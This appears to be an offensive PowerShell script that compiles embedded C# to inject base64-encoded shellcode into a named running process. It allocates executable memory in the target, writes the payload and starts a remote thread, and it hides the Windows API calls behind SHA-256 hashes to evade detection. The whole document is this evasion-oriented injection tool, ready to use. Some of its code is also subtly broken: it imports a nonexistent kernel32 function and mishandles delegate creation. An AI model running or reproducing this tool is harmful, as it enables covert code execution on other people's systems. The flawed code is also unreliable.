# C# code for CreateRemoteThread Injection with API Hashing
$RemoteThreadInjectionApiCode = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

public class RemoteThreadInjectionApi
{
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate IntPtr OpenProcessDelegate(uint processAccess, bool bInheritHandle, int processId);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate IntPtr VirtualAllocExDelegate(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate bool WriteProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate IntPtr CreateRemoteThreadDelegate(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    private static OpenProcessDelegate OpenProcess;
    private static VirtualAllocExDelegate VirtualAllocEx;
    private static WriteProcessMemoryDelegate WriteProcessMemory;
    private static CreateRemoteThreadDelegate CreateRemoteThread;

    static RemoteThreadInjectionApi()
    {
        OpenProcess = (OpenProcessDelegate)GetFunctionPointerWithHash("kernel32.dll", 0x16BA1DC6);
        VirtualAllocEx = (VirtualAllocExDelegate)GetFunctionPointerWithHash("kernel32.dll", 0x04CE1B3B);
        WriteProcessMemory = (WriteProcessMemoryDelegate)GetFunctionPointerWithHash("kernel32.dll", 0x1BA8A7DD);
        CreateRemoteThread = (CreateRemoteThreadDelegate)GetFunctionPointerWithHash("kernel32.dll", 0x02611A2F);
    }

    public static void Inject(string processName, byte[] shellcode)
    {
        Process[] processes = Process.GetProcessesByName(processName);
        if (processes.Length == 0)
        {
            throw new Exception("Process not found.");
        }
        Process process = processes[0];

        IntPtr hProcess = OpenProcess(0x001F0FFF, false, process.Id);
        if (hProcess == IntPtr.Zero)
        {
            throw new Exception("Failed to open process.");
        }

        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        if (addr == IntPtr.Zero)
        {
            throw new Exception("Failed to allocate memory.");
        }

        UIntPtr bytesWritten;
        if (!WriteProcessMemory(hProcess, addr, shellcode, (uint)shellcode.Length, out bytesWritten))
        {
            throw new Exception("Failed to write memory.");
        }

        IntPtr threadId;
        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out threadId);
        if (hThread == IntPtr.Zero)
        {
            throw new Exception("Failed to create remote thread.");
        }
    }

    private static Delegate GetFunctionPointerWithHash(string dllName, uint functionHash)
    {
        IntPtr hModule = GetModuleHandle(dllName);
        if (hModule == IntPtr.Zero)
        {
            hModule = LoadLibrary(dllName);
            if (hModule == IntPtr.Zero)
            {
                throw new Exception("Failed to load library {dllName}.");
            }
        }

        IntPtr pFuncAddr = IntPtr.Zero;
        for (int i = 0; ; i++)
        {
            IntPtr pFuncName = GetProcAddressByOrdinal(hModule, (ushort)i);
            if (pFuncName == IntPtr.Zero)
                break;

            string funcName = Marshal.PtrToStringAnsi(pFuncName);
            if (HashString(funcName) == functionHash)
            {
                pFuncAddr = GetProcAddress(hModule, funcName);
                break;
            }
        }

        if (pFuncAddr == IntPtr.Zero)
        {
            throw new Exception("Failed to get address of function with hash {functionHash}.");
        }

        return Marshal.GetDelegateForFunctionPointer(pFuncAddr, typeof(Delegate));
    }

    private static uint HashString(string input)
    {
        using (SHA256 sha256 = SHA256.Create())
        {
            byte[] bytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(input));
            return BitConverter.ToUInt32(bytes, 0);
        }
    }

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr LoadLibrary(string lpLibFileName);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr GetProcAddressByOrdinal(IntPtr hModule, ushort ordinal);
}
"@

# Add the C# code to PowerShell
Add-Type -TypeDefinition $RemoteThreadInjectionApiCode -Language CSharp

function Invoke-RemoteThreadApiHashing {
    param (
        [string]$ProcessName,
        [string]$ShellcodeBase64
    )

    $shellcode = [Convert]::FromBase64String($ShellcodeBase64)
    [RemoteThreadInjectionApi]::Inject($ProcessName, $shellcode)
}
